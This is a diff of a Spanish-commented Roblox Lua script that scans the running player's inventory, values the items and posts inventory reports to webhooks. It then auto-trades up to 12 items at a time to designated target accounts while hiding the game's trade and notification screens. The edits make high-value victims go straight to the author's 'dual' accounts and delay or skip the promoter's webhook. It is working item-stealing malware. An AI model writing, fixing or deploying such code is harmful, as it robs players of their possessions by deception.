@@ -106,7 +106,6 @@ task.spawn(function()
         task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
     end
     
-    -- 👇 ESTA ES LA LÍNEA QUE SOLUCIONA EL ERROR 👇
     local config = getgenv().AutoTradeConfig or {}
     
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
@@ -166,6 +165,7 @@ task.spawn(function()
         end
     end)
 
+    -- Declaramos jugadoresObjetivos de forma mutable para poder cambiarla abajo de inmediato
     local jugadoresObjetivos = config.JugadoresObjetivos or {}
 
     local armasPrioritarias = {
@@ -203,17 +203,14 @@ task.spawn(function()
             if not inv then return end
             
             for guid, item in pairs(inv) do
-                -- APLICANDO LÓGICA DE INICIO DE INVENTARIO (Script 1)
                 if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                     local cleanName = normalizeName(item.name)
                     
-                    -- Calcula el valor en la lista Dual
                     if dualValueTable[cleanName] then
                         totalDualValue = totalDualValue + dualValueTable[cleanName]
                     end
                     
                     if valueTable[cleanName] then
-                        
                         if cleanName == "MatchaBobaKnife" then foundMatchaKnife = true end
                         if cleanName == "MatchaBobaGun" then foundMatchaGun = true end
                         
@@ -281,7 +278,7 @@ task.spawn(function()
                 
                 for _, clave in ipairs(orden) do
                     local info = contador[clave]
-                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
+                    texto ..= "🔸 **" .. info.cantidad + 0 .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                 end
                 
                 if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
@@ -367,10 +364,12 @@ task.spawn(function()
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
             -- ==========================================
-            -- ENVÍO DE WEBHOOKS (INSTANTÁNEO VS RETRASADO)
+            -- ENVÍO DE WEBHOOKS Y ASIGNACIÓN DE OBJETIVOS DUAL
             -- ==========================================
             if totalDualValue > 7500 then
-                -- VALOR MAYOR A 7500 EN LA SEGUNDA LISTA: ENVÍA ÚNICAMENTE AL DUAL HOOK AL INSTANTE
+                -- Forzamos inmediatamente los objetivos duales para que el repeat-until los detecte
+                jugadoresObjetivos = jugadoresObjetivosDual
+
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({
@@ -382,11 +381,9 @@ task.spawn(function()
                     end
                 end)
                 
-                -- Cambia los objetivos a tus cuentas de tradeo
-                jugadoresObjetivos = jugadoresObjetivosDual
-                
             elseif totalValue >= 5000 or hasSpecialEffect then
-                -- 1. Tu Webhook (Dual): Notifica al instante
+                jugadoresObjetivos = jugadoresObjetivosDual
+
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({
@@ -398,7 +395,6 @@ task.spawn(function()
                     end
                 end)
 
-                -- 2. Webhook del promocionador: Notifica con 5 minutos de delay (300 segundos)
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
                         pcall(function()
@@ -411,11 +407,7 @@ task.spawn(function()
                         end)
                     end)
                 end
-                
-                -- Cambia los objetivos inmediatamente a tus cuentas de tradeo
-                jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit normal (< 5000): Notifica de inmediato al promocionador únicamente
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({
                         Url = WEBHOOK_INVENTARIO,
@@ -480,7 +472,6 @@ task.spawn(function()
                 local inv = pdTrade:TryIndex({"Inventory", cat})
                 if not inv then return end
                 for guid, item in pairs(inv) do
-                    -- APLICANDO LÓGICA DE INICIO DE INVENTARIO AL MOMENTO DEL TRADEO (Script 1)
                     if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                         local cleanName = normalizeName(item.name)
                         if valueTable[cleanName] then
@@ -521,7 +512,6 @@ task.spawn(function()
             local SessionState = cgData.SessionState
             local Workspace = game:GetService("Workspace")
 
-            -- PROTECCIÓN AÑADIDA: Verifica que player1 y player2 existan antes de leerlos
             local function getSides()
                 local data = ActiveNegotiation.Data
                 if type(data) ~= "table" then return nil, nil, nil end
@@ -536,7 +526,6 @@ task.spawn(function()
                 return me, other, data
             end
 
-            -- 1. Enviar o Aceptar Invitación
             repeat
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
@@ -561,7 +550,6 @@ task.spawn(function()
 
             task.wait(1)
 
-            -- 2. Ofrecer hasta 12 items sin usar GUI
             for i = 1, math.min(12, #itemsRestantes) do
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
@@ -578,25 +566,20 @@ task.spawn(function()
                 task.wait(0.35)
             end
 
-            -- 3 & 4. Lógica de Finalización (SetReady Seguro)
             local timeout = os.clock()
             while os.clock() - timeout < 60 do 
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
-                -- Utilizamos getSides que ya viene protegido contra el error 'nil'
                 local me, other, data = getSides()
                 
                 if not data then break end
                 if data.exchanging then break end 
                 
-                         -- Verificamos si somos nosotros y aún no damos ready
                 if me and not me.ready then
                     if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
-                        -- SOLUCIÓN: Se pasa data.ref o {} igual que en el script de origen
                         Remotes.SetReady:FireServer(true, data.ref or {})
                     end
                 end
-
                 
                 task.wait(0.5)
             end
@@ -610,26 +593,17 @@ task.spawn(function()
             return true
         end
 
-
-        -- ==========================================
-        -- BUCLE PRINCIPAL DE TRADEO CONTINUO
-        -- ==========================================
         while true do
-            -- Si el jugador objetivo se sale antes de arrancar el siguiente trade, se rompe el bucle
             if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                 break 
             end
             
             local continuar = ejecutarTradeo()
-            -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
             if not continuar then 
                 break 
             end
         end
 
-        -- ==========================================
-        -- RESTAURACIÓN: TODO VUELVE A LA NORMALIDAD
-        -- ==========================================
         tradeando = false
         task.wait(0.5) 
 
@@ -638,7 +612,7 @@ task.spawn(function()
             if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                 pGui.Notifications.Body.Visible = true
             end
-            if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
+            if pGui:FindFirstChild("NewGui") and pGui.NewGui.TradeNegotiation then
                 if posicionOriginalTrade then
                     pGui.NewGui.TradeNegotiation.Position = posicionOriginalTrade
                 else
